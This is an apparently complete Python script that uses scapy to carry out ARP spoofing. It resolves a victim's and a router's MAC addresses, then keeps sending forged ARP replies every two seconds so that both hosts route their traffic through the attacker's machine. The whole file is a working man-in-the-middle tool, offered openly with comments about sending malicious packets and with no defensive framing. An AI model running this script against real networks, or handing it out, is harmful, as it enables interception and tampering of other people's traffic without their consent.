import scapy.all as scapy
import sys
import time


class ArpSpoofer:
    def getMacAddress(self,ipAdd):
        
        #Creating a broadcast packet 
        broadcastLayer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arpLayer = scapy.ARP(pdst=ipAdd)
        
        #broadcast.show()
        #arpLayer.show()
        
        macPacket = broadcastLayer/arpLayer
        
        #spoofPacket.show()
        
        #Sending arp packet to victim
        answer= scapy.srp(macPacket,timeout=2,verbose=False)[0]

        #returning mac address
        return str(answer[0][1].hwsrc)

    def spoof(self,victimIp,victimMac,routerIp,routerMac):
        #Spoofing mac address
        packetToRouter = scapy.ARP(op=2,hwdst=routerMac,pdst=routerIp,psrc=victimIp)
        packetToVictim = scapy.ARP(op=2,hwdst=victimMac,pdst=victimIp,psrc=routerIp)
        
        # packetToVictim.show()
        # packetToRouter.show()
        
        #Sending malacious packets
        scapy.send(packetToRouter)   
        scapy.send(packetToVictim)   


if __name__ == "__main__":
    
    try:
        #Taking victim's ip address and router ip address
        routerIp = str(sys.argv[2])
        victimIp = str(sys.argv[1])
    except :
        
        print("[!!] *No argument specified!\n")
        print("[+] *Help: python malicious_arp_packet.py [victimIpAddress] [routerIPAddress]\n")    
        exit(0)
        
    if(routerIp == None): 
        #Getting router ip address 
        ipList = str(victimIp).split('.')
        ipList[3] = '1'
        routerIp ='.'.join(ipList)
        routerIp = routerIp.strip("b'")

    try:
        #Getting mac addresses
        spoofer = ArpSpoofer()
        victimMacAdd = spoofer.getMacAddress(bytes(victimIp,'utf-8'))
        routerMacAdd = spoofer.getMacAddress(bytes(routerIp,'utf-8'))
        
    except Exception as e:
        print(e)
        print("[-] *Can't spoof! Something went wrong!!!")
        exit(0)
        
    #Spoofing the victim

    try:
        while True:
            spoofer.spoof(victimIp,victimMacAdd,routerIp,routerMacAdd)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("Closing ARP Spoofer...")
        exit(0)

    
    